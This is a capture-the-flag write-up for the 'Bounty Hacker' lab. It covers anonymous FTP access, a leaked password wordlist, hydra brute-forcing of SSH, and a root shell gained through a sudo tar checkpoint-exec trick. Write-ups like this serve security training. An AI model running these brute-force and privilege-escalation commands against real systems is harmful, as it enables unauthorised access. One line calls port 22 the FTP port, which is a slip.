# Bounty Hacker WriteUp

## Reconnaissance

Using nmap, we'll find 3 ports:
- 21/TCP with ftp access, allow login as Anonymous.
- 22/TCP with ssh access.
- 80/TCP with http access.

access port 22 using ftp and we'll find two files:
1. locks.txt
2. task.txt

task.txt contains:
```txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
while the locks.txt file contains:
```txt
- rEddrAGON
- ReDdr4g0nSynd!cat3
- Dr@gOn$yn9icat3
- R3DDr46ONSYndIC@Te
- ReddRA60N
- R3dDrag0nSynd1c4te
- dRa6oN5YNDiCATE
- ReDDR4g0n5ynDIc4te
- R3Dr4gOn2044
- RedDr4gonSynd1cat3
- R3dDRaG0Nsynd1c@T3
- Synd1c4teDr@g0n
- reddRAg0N
- REddRaG0N5yNdIc47e
- Dra6oN$yndIC@t3
- 4L1mi6H71StHeB357
- rEDdragOn$ynd1c473
- DrAgoN5ynD1cATE
- ReDdrag0n$ynd1cate
- Dr@gOn$yND1C4Te
- RedDr@gonSyn9ic47e
- REd$yNdIc47e
- dr@goN5YNd1c@73
- rEDdrAGOnSyNDiCat3
- r3ddr@g0N
- ReDSynd1ca7e
```
looks like it was some kind of password

## Bruteforce SSH Access
now let's try to access port 22 with the password we got. i make a userslist to bruteforce both users and passwords using hydra(while actually I've got lin as the task writer :/)

```sh
sudo hydra -L userlist.txt -P locks.txt ssh://[Machine_IP]

#or

sudo hydra -l lin -P locks.txt ssh://[Machine_IP] #should work too
```

then we'll get the access through ssh as lin

in lin home we'll find the first flag which is **user.txt**

## Privilege Escalation
Now our final task is doing a Privilege Escalation. Enter

```sh
sudo -l
```

So we'll get list of command we able to do with ```sudo```.

after that, we'll find out that we could do command ```tar``` with sudo. so, I went through GTFObin to find how we can spawn a shell with root access:
```sh
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
It will spawn a shell wiht root access, therefore, we'll get the last flag which is **root.txt**
